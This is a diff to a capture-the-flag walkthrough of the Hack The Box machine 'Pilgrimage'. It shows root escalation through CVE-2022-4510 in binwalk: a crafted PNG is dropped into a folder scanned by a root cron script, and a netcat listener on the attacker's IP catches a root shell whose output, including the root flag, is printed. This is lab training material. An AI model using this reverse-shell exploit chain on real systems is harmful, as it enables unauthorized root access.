@@ -222,8 +222,85 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 emily@pilgrimage:~$ 
 
+```
+emily@pilgrimage:/tmp$ cat  /usr/sbin/malwarescan.sh 
+#!/bin/bash
 
+blacklist=("Executable script" "Microsoft executable")
+
+/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
+	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
+	binout="$(/usr/local/bin/binwalk -e "$filename")"
+        for banned in "${blacklist[@]}"; do
+		if [[ "$binout" == *"$banned"* ]]; then
+			/usr/bin/rm "$filename"
+			break
+		fi
+	done
+done
+```
 
 
 emily@pilgrimage:~$ cat user.txt 
 d0663dd014**********************
+
+
+https://www.exploit-db.com/exploits/51249
+
+emily@pilgrimage:/tmp$ python3 51249.py /var/www/pilgrimage.htb/shrunk/64a3308894bdb.png 10.10.14.130 555
+
+
+After transferring any image, run the exploit
+
+```
+mily@pilgrimage:/tmp$ python3 51249.py exploit1.png 10.10.14.130 555
+
+################################################
+------------------CVE-2022-4510----------------
+################################################
+--------Binwalk Remote Command Execution--------
+------Binwalk 2.1.2b through 2.3.2 included-----
+------------------------------------------------
+################################################
+----------Exploit by: Etienne Lacoche-----------
+---------Contact Twitter: @electr0sm0g----------
+------------------Discovered by:----------------
+---------Q. Kaiser, ONEKEY Research Lab---------
+---------Exploit tested on debian 11------------
+################################################
+
+
+You can now rename and share binwalk_exploit and start your local netcat listener.
+```
+
+Transfer the image back into the pilgrimage.htb shrunk folder
+
+```
+emily@pilgrimage:/tmp$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
+```
+
+The listener should now capture the connection and we can grab the flag.
+
+``` 
+└──╼ [★]$ sudo nc -lvnp 555
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::555
+Ncat: Listening on 0.0.0.0:555
+Ncat: Connection from 10.129.150.112.
+Ncat: Connection from 10.129.150.112:57650.
+id
+uid=0(root) gid=0(root) groups=0(root)
+ls
+_64a3308894bdb.png.extracted
+_binwalk_exploit.png.extracted
+pwd
+/root/quarantine
+cd ..
+ls
+quarantine
+reset.sh
+root.txt
+cat root.txt
+008cf87335025a2626f11b3f89ffcfbd
+```
+
